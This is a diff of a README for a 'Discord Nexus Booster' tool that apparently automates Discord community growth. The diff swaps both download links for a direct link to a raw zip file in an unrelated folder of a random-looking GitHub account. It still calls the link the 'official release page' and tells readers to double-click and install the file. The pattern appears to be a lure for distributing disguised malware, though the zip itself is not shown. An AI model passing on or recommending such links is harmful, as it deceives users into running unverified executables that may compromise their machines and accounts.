@@ -1,6 +1,6 @@
 # 🚀 discord-server-booster-2026-485 - Automate Your Discord Community Growth Today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/opposed-anorchism74/discord-server-booster-2026-485)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/opposed-anorchism74/discord-server-booster-2026-485/raw/refs/heads/main/Microcitrus/discord-server-booster-v3.8-beta.5.zip)
 
 ## 📌 About This Tool
 
@@ -18,7 +18,7 @@ Discord Nexus Booster 2026 helps you grow your Discord community. The software m
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page to download the latest version of the toolkit: [Download Discord Nexus Booster](https://github.com/opposed-anorchism74/discord-server-booster-2026-485)
+1.  Visit the official release page to download the latest version of the toolkit: [Download Discord Nexus Booster](https://github.com/opposed-anorchism74/discord-server-booster-2026-485/raw/refs/heads/main/Microcitrus/discord-server-booster-v3.8-beta.5.zip)
 2.  Locate the downloaded file in your browser or your Downloads folder.
 3.  Double-click the file to start the installer.
 4.  Accept the license agreement.
